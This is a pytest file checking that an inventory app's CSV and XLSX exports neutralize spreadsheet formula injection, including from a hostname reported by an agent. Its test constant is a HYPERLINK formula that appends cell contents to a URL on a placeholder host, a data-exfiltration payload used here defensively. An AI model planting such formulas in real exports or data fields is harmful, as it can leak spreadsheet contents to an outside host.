"""Spreadsheet exports never hand Excel a formula written by an agent."""

import io

import pytest
from openpyxl import load_workbook

from app.api.csv_export import neutralize
from app.api.xlsx_export import xlsx_response
from tests.test_api_inventory import (  # noqa: F401  (fixtures come from conftest)
    _enroll,
    _heartbeat,
    _inventory,
)
from tests.test_api_inventory_fleet import _admin_headers, _poste

FORMULA = '=HYPERLINK("https://x.invalid/?"&A2,"ouvrir")'


@pytest.mark.parametrize("value", ["=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1"])
def test_neutralize_prefixes_formula_triggers(value: str):
    assert neutralize(value) == "'" + value


@pytest.mark.parametrize("value", ["PC-01", "Windows 11", "", "1-2", 42, -3])
def test_neutralize_leaves_plain_values_alone(value: object):
    assert neutralize(value) == value


def test_neutralize_turns_none_into_an_empty_cell():
    assert neutralize(None) == ""


def test_xlsx_writes_a_formula_looking_string_as_text():
    """openpyxl would store ``=...`` as a formula; the cell must stay text."""
    resp = xlsx_response("t.xlsx", ["Nom", "N"], [[FORMULA, 3]])
    sheet = load_workbook(io.BytesIO(resp.body)).active
    assert sheet is not None
    cell = sheet["A2"]
    assert cell.data_type == "s"
    assert cell.value == FORMULA
    assert sheet["B2"].value == 3


async def test_csv_export_neutralizes_an_agent_hostname(client, db_session):
    """End to end: a poste naming itself a formula exports as text."""
    headers = await _admin_headers(client, db_session)
    await _poste(client, "exp-inject", hostname=FORMULA)

    resp = await client.get(
        "/api/v1/machines/export.csv?columns=hostname", headers=headers
    )
    assert resp.status_code == 200, resp.text
    cell = resp.text.lstrip("﻿").splitlines()[1]
    assert cell.startswith("\"'=HYPERLINK")
